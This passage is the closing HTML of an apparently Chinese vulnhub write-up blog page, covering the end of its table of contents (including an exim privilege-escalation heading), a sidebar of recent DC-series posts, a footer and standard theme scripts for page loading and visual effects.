class="toc-number">1.3.</span> <span class="toc-text">exim提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/25/vulnhub-DC-8/" title="vulnhub-DC-8"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-8"/></a><div class="content"><a class="title" href="/2024/11/25/vulnhub-DC-8/" title="vulnhub-DC-8">vulnhub-DC-8</a><time datetime="2024-11-25T12:58:24.000Z" title="发表于 2024-11-25 20:58:24">2024-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/vulnhub-DC-7/" title="vulnhub-DC-7"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-7"/></a><div class="content"><a class="title" href="/2024/11/21/vulnhub-DC-7/" title="vulnhub-DC-7">vulnhub-DC-7</a><time datetime="2024-11-21T13:16:12.000Z" title="发表于 2024-11-21 21:16:12">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-6"/></a><div class="content"><a class="title" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6">vulnhub-DC-6</a><time datetime="2024-11-21T04:27:57.000Z" title="发表于 2024-11-21 12:27:57">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-5"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5">vulnhub-DC-5</a><time datetime="2024-11-20T13:04:36.000Z" title="发表于 2024-11-20 21:04:36">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-4"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4">vulnhub-DC-4</a><time datetime="2024-11-20T09:49:17.000Z" title="发表于 2024-11-20 17:49:17">2024-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Six_plum</div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- 樱花特效 启用时删去下面的<!即可-->
+<!<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yremp/yremp-js@1.5/sakura.js"><!</script></body></html><!<script type="text/javascript" src="\js\sakura.js"><!</script>
